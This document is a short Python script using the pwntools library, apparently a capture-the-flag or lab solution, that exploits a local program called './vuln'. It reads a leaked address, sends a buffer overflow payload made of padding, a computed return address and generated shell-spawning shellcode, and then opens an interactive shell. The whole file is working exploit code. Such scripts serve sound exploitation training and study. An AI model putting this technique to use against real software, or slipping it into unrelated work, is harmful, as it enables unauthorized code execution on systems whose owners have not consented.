#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN

# Determined through static analysis.
bytes_read = 0x200
offset = 0x4

shellcode = asm(shellcraft.sh())

io = process(BIN)
str_addr = io.recvline().strip(b"\n")
addr = int(str_addr, 16)

# Inject and trigger
payload = b""
payload += (offset + 8) * b'A'
payload += pack(addr + offset + 16)
payload += shellcode

io.send(payload)
io.interactive()
